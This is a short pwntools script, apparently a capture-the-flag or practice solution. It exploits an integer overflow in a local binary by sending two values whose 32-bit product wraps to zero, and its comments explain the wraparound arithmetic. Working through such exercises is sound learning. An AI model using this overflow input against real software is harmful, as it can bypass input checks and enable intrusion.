import math
import pwn

if __name__ == "__main__":
    target = pwn.process("./a.out")

    # A standard C `int` on an x86_64 Linux system takes up 32 bits.
    # If an arithmetic calculation exceeds the possible range of integers, the
    # *typical* behaviour is to simply wraparound (not true for all platforms).
    # Thus, we need 2 non-zero integers x and y that when multiplied, results
    # in the bottom 32 bits being zero. One of many solutions can be seen below.

    #     x = sqrt(2^32) =      65536 = 0b10000000000000000
    #     y = sqrt(2^32) =      65536 = 0b10000000000000000
    # x * y =       2^32 = 4294967296 = 0b100000000000000000000000000000000
    solution = math.isqrt(2 ** 32)
    payload = f"{solution} {solution}".encode()

    target.sendline(payload)
    target.interactive()

